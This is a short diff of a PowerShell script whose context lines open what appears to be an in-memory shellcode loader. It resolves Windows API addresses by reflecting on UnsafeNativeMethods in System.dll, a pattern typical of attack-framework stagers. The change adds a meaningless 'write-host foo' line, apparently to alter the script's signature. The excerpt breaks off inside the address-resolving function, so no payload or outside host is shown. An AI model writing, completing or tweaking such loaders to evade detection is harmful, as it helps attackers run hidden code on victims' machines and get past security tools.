@@ -1,5 +1,7 @@
 Set-StrictMode -Version 2                                                                                                                                           
-                                                                                                                                                                    
+
+write-host foo
+                            
 function func_get_proc_address {                                                                                                                                    
         Param ($var_module, $var_procedure)                                                                                                                         
         $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')                                                                                                         
